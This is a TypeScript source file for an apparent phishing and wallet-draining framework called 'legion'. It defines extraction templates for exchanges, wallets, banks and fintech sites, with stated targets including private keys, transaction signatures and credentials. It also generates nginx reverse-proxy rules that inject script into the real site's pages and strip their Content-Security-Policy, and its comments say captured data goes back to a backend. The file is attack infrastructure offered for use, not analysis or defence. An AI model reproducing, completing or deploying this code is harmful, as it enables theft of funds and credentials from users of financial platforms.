/**
 * EXTRACTION TEMPLATES - Base Architecture
 *
 * Phase 3: Platform-specific extraction logic
 * Each template knows:
 * - Where to inject scripts (DOM elements)
 * - What data to extract (wallets, APIs, transactions)
 * - How to intercept (hooks, events, API calls)
 * - What chain/network (EVM, Solana, TRON, etc)
 *
 * Template structure:
 * 1. Inject detection code
 * 2. Hook into wallet/API events
 * 3. Extract on user action
 * 4. Return to legion backend
 */

export interface ExtractionTemplate {
  name: string
  category: 'cex' | 'dex' | 'wallet' | 'bank' | 'fintech' | 'bridge' | 'lending'
  platforms: string[] // domains: ['app.uniswap.org', 'uniswap.org']
  supportedChains: string[] // ['ethereum', 'polygon', 'arbitrum', etc]
  injectionPoints: string[] // DOM elements or URL patterns
  extractionTargets: ExtractionTarget[]
  walletDetection: WalletDetectionConfig
  apiEndpoints: APIEndpointConfig[]
  scriptContent: string // Injected JavaScript code
}

export interface ExtractionTarget {
  name: string // 'wallet_address', 'private_key', 'transaction_signature'
  type: 'wallet' | 'signature' | 'transaction' | 'balance' | 'allowance' | 'price' | 'liquidity' | 'credential'
  location: 'storage' | 'memory' | 'dom' | 'api_intercept' | 'window_object'
  selector?: string // CSS selector if DOM
  eventTrigger?: string // 'user_action' | 'page_load' | 'window_ethereum_request'
  extractionMethod: 'direct' | 'hook' | 'intercept' | 'parse'
}

export interface WalletDetectionConfig {
  detection: {
    metamask?: boolean
    phantom?: boolean
    ledger?: boolean
    trezor?: boolean
    trustwallet?: boolean
    coinbase?: boolean
    walletconnect?: boolean
  }
  signatureMethod: 'eth_signTypedData_v4' | 'eth_sign' | 'signMessage' | 'signTransaction'
  permissionRequest: string[] // ['eth_accounts', 'eth_signTypedData_v4']
}

export interface APIEndpointConfig {
  name: string
  method: 'GET' | 'POST'
  path: string // '/api/v1/swap', '/api/trade/orders'
  interceptionType: 'request' | 'response' | 'both'
  dataToExtract: string[] // ['route', 'amounts', 'signature']
  chainSpecific?: boolean
}

export abstract class BaseExtractionTemplate implements ExtractionTemplate {
  abstract name: string
  abstract category: 'cex' | 'dex' | 'wallet' | 'bank' | 'fintech' | 'bridge' | 'lending'
  abstract platforms: string[]
  abstract supportedChains: string[]
  abstract injectionPoints: string[]
  abstract extractionTargets: ExtractionTarget[]
  abstract walletDetection: WalletDetectionConfig
  abstract apiEndpoints: APIEndpointConfig[]
  abstract scriptContent: string

  /**
   * Validate template structure
   */
  validate(): { valid: boolean; errors: string[] } {
    const errors: string[] = []

    if (!this.name) errors.push('Template must have a name')
    if (!this.category) errors.push('Template must have a category')
    if (!this.platforms || this.platforms.length === 0) errors.push('Template must specify platforms')
    if (!this.extractionTargets || this.extractionTargets.length === 0) errors.push('Template must specify extraction targets')
    if (!this.scriptContent) errors.push('Template must have script content')

    return {
      valid: errors.length === 0,
      errors,
    }
  }

  /**
   * Generate injection script (injects into page via sub_filter)
   */
  getInjectionScript(): string {
    return `
<script>
window.__LEGION_TEMPLATE__ = {
  name: '${this.name}',
  category: '${this.category}',
  timestamp: new Date().toISOString(),
  extractionTargets: ${JSON.stringify(this.extractionTargets)},
  walletDetection: ${JSON.stringify(this.walletDetection)}
};

${this.scriptContent}

// Auto-start extraction
(function() {
  if (window.__LEGION_EXTRACTION__) {
    window.__LEGION_EXTRACTION__.initialize();
  }
})();
</script>
    `.trim()
  }

  /**
   * Get headers needed for API calls
   */
  getAPIHeaders(): Record<string, string> {
    return {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
    }
  }

  /**
   * Parse extraction response
   */
  parseResponse(data: any): Record<string, any> {
    return data
  }
}

/**
 * Template Registry
 */
export class TemplateRegistry {
  private templates: Map<string, ExtractionTemplate> = new Map()

  register(template: ExtractionTemplate): void {
    const validation = (template as any).validate?.()
    if (validation && !validation.valid) {
      throw new Error(`Invalid template: ${validation.errors.join(', ')}`)
    }

    this.templates.set(template.name, template)
    console.error(`[template-registry] Registered: ${template.name} (${template.category})`)
  }

  /**
   * Get template by name
   */
  getTemplate(name: string): ExtractionTemplate | null {
    return this.templates.get(name) || null
  }

  /**
   * Find template by domain
   */
  findByDomain(domain: string): ExtractionTemplate | null {
    for (const template of this.templates.values()) {
      if (template.platforms.some(p => domain.includes(p))) {
        return template
      }
    }
    return null
  }

  /**
   * Find templates by category
   */
  findByCategory(category: string): ExtractionTemplate[] {
    return Array.from(this.templates.values()).filter(t => t.category === category)
  }

  /**
   * List all templates
   */
  listAll(): ExtractionTemplate[] {
    return Array.from(this.templates.values())
  }

  /**
   * Get summary
   */
  getSummary() {
    const byCat: Record<string, number> = {}
    for (const t of this.templates.values()) {
      byCat[t.category] = (byCat[t.category] || 0) + 1
    }

    return {
      totalTemplates: this.templates.size,
      byCategory: byCat,
      templates: Array.from(this.templates.keys()),
    }
  }
}

/**
 * Template Injector - handles script injection
 */
export class TemplateInjector {
  private registry: TemplateRegistry

  constructor(registry: TemplateRegistry) {
    this.registry = registry
  }

  /**
   * Generate nginx sub_filter rules for template
   */
  generateNginxRules(template: ExtractionTemplate): string {
    const injectionPoints = template.injectionPoints.join('|')
    const script = template.getInjectionScript().replace(/'/g, "\\'")

    return `
    location ~ ^/(${injectionPoints})/?$ {
      proxy_pass https://$host;
      proxy_ssl_server_name on;

      # Inject extraction template
      sub_filter '</head>' '<script>${script}</script></head>';
      sub_filter_once on;

      # Pass through everything else
      proxy_hide_header Content-Security-Policy;
      add_header Content-Security-Policy "default-src * 'unsafe-inline' 'unsafe-eval' blob: data:";
    }
    `
  }

  /**
   * Check if template should be injected for URL
   */
  shouldInject(template: ExtractionTemplate, url: string): boolean {
    // Check domain match
    const domain = new URL(url).hostname
    const domainMatch = template.platforms.some(p => domain.includes(p))
    if (!domainMatch) return false

    // Check injection points
    const path = new URL(url).pathname
    const pointMatch = template.injectionPoints.some(p => path.includes(p) || path === `/${p}`)

    return pointMatch
  }
}

/**
 * Data extractor - processes extracted data
 */
export class DataExtractor {
  private template: ExtractionTemplate

  constructor(template: ExtractionTemplate) {
    this.template = template
  }

  /**
   * Extract from window object
   */
  extractFromWindow(data: any): Record<string, any> {
    const result: Record<string, any> = {}

    for (const target of this.template.extractionTargets) {
      if (target.location !== 'window_object') continue

      // Navigate nested object
      const parts = target.name.split('.')
      let value = data
      for (const part of parts) {
        value = value?.[part]
      }

      if (value !== undefined) {
        result[target.name] = value
      }
    }

    return result
  }

  /**
   * Extract from DOM
   */
  extractFromDOM(html: string): Record<string, any> {
    const result: Record<string, any> = {}

    for (const target of this.template.extractionTargets) {
      if (target.location !== 'dom' || !target.selector) continue

      // Simple regex extraction (in real app, use DOM parser)
      const regex = new RegExp(`${target.selector}[^>]*>([^<]+)<`, 'i')
      const match = html.match(regex)

      if (match?.[1]) {
        result[target.name] = match[1]
      }
    }

    return result
  }

  /**
   * Extract from API intercept
   */
  extractFromAPI(requestBody: any, responseBody: any): Record<string, any> {
    const result: Record<string, any> = {}

    for (const target of this.template.extractionTargets) {
      if (target.location !== 'api_intercept') continue

      // Try request first, then response
      const data = requestBody?.[target.name] || responseBody?.[target.name]
      if (data !== undefined) {
        result[target.name] = data
      }
    }

    return result
  }
}
